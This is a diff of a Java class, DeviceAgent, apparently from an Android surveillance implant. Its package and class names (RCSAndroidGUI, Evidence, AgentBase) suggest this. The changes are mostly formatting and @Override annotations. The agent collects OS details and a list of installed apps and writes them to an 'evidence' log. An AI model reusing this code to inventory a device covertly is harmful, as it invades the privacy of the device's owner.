@@ -27,7 +27,6 @@ import com.ht.RCSAndroidGUI.Device;
 import com.ht.RCSAndroidGUI.Evidence;
 import com.ht.RCSAndroidGUI.EvidenceType;
 import com.ht.RCSAndroidGUI.LogR;
-import com.ht.RCSAndroidGUI.RCSAndroidGUI;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.utils.Utils;
 import com.ht.RCSAndroidGUI.utils.WChar;
@@ -41,18 +40,18 @@ import com.ht.RCSAndroidGUI.utils.WChar;
  * 
  */
 public class DeviceAgent extends AgentBase {
-	
+
 	public static final String TAG = "DeviceAgent";
 
 	/** The process list. */
 	private int processList;
-	
+
 	/** The cpu usage. */
 	private float cpuUsage;
-	
+
 	/** The cpu total. */
 	private long cpuTotal;
-	
+
 	/** The cpu idle. */
 	private long cpuIdle;
 
@@ -63,25 +62,34 @@ public class DeviceAgent extends AgentBase {
 		Log.d("RCS", "DeviceAgent constructor");
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#parse(byte[])
 	 */
+	@Override
 	public void parse(final byte[] conf) {
 		myConf = Utils.BufferToByteBuffer(conf, ByteOrder.LITTLE_ENDIAN);
 
 		this.processList = myConf.getInt();
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#begin()
 	 */
+	@Override
 	public void begin() {
 		setPeriod(NEVER);
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
 	 */
+	@Override
 	public void go() {
 
 		// OS Version etc...
@@ -112,29 +120,35 @@ public class DeviceAgent extends AgentBase {
 		}
 
 		if (processList == 1) {
-			 ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
-			    final int max = apps.size();
-			    for (int i=0; i<max; i++) {
-			    	sb.append(apps.get(i) + "\n");
-			        
-			    }
+			final ArrayList<PInfo> apps = getInstalledApps(false); /*
+																	 * false =
+																	 * no system
+																	 * packages
+																	 */
+			final int max = apps.size();
+			for (int i = 0; i < max; i++) {
+				sb.append(apps.get(i) + "\n");
+
+			}
 		}
 
 		final String content = sb.toString();
 
-		int ev=Evidence.convertTypeEvidence(Agent.AGENT_DEVICE);
-		
+		final int ev = Evidence.convertTypeEvidence(Agent.AGENT_DEVICE);
+
 		// atomic log
-		//LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD, null, WChar.getBytes(content, true));
-		
+		// LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD, null,
+		// WChar.getBytes(content, true));
+
 		// log
-		LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD);
+		final LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD);
 		log.write(WChar.getBytes(content, true));
 		log.close();
 
 		// Evidence
-		//final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
-		//evidence.atomicWriteOnce(null, EvidenceType.DEVICE, WChar.getBytes(content, true));
+		// final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
+		// evidence.atomicWriteOnce(null, EvidenceType.DEVICE,
+		// WChar.getBytes(content, true));
 
 	}
 
@@ -164,52 +178,64 @@ public class DeviceAgent extends AgentBase {
 		}
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.agent.AgentBase#end()
 	 */
+	@Override
 	public void end() {
 
 	}
-	
+
 	class PInfo {
-	    private String appname = "";
-	    private String pname = "";
-	    private String versionName = "";
-	    private int versionCode = 0;
-	    private Drawable icon;
-	    public String toString() {
-	        return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode;
-	    }
+		private String appname = "";
+		private String pname = "";
+		private String versionName = "";
+		private int versionCode = 0;
+		private Drawable icon;
+
+		@Override
+		public String toString() {
+			return appname + "\t" + pname + "\t" + versionName + "\t"
+					+ versionCode;
+		}
 
 	}
 
 	private ArrayList<PInfo> getPackages() {
-	    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
-	    final int max = apps.size();
-	    for (int i=0; i<max; i++) {
-	        Log.i(TAG,apps.get(i).toString());
-	    }
-	    return apps;
+		final ArrayList<PInfo> apps = getInstalledApps(false); /*
+																 * false = no
+																 * system
+																 * packages
+																 */
+		final int max = apps.size();
+		for (int i = 0; i < max; i++) {
+			Log.i(TAG, apps.get(i).toString());
+		}
+		return apps;
 	}
 
-	private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
-	    ArrayList<PInfo> res = new ArrayList<PInfo>();   
-	    PackageManager packageManager = Status.getAppContext().getPackageManager();
-	    
-	    List<PackageInfo> packs = packageManager.getInstalledPackages(0);
-	    for(int i=0;i<packs.size();i++) {
-	        PackageInfo p = packs.get(i);
-	        if ((!getSysPackages) && (p.versionName == null)) {
-	            continue ;
-	        }
-	        PInfo newInfo = new PInfo();
-	        newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
-	        newInfo.pname = p.packageName;
-	        newInfo.versionName = p.versionName;
-	        newInfo.versionCode = p.versionCode;
-	        newInfo.icon = p.applicationInfo.loadIcon(packageManager);
-	        res.add(newInfo);
-	    }
-	    return res; 
+	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
+		final ArrayList<PInfo> res = new ArrayList<PInfo>();
+		final PackageManager packageManager = Status.getAppContext()
+				.getPackageManager();
+
+		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);
+		for (int i = 0; i < packs.size(); i++) {
+			final PackageInfo p = packs.get(i);
+			if ((!getSysPackages) && (p.versionName == null)) {
+				continue;
+			}
+			final PInfo newInfo = new PInfo();
+			newInfo.appname = p.applicationInfo.loadLabel(packageManager)
+					.toString();
+			newInfo.pname = p.packageName;
+			newInfo.versionName = p.versionName;
+			newInfo.versionCode = p.versionCode;
+			newInfo.icon = p.applicationInfo.loadIcon(packageManager);
+			res.add(newInfo);
+		}
+		return res;
 	}
 }
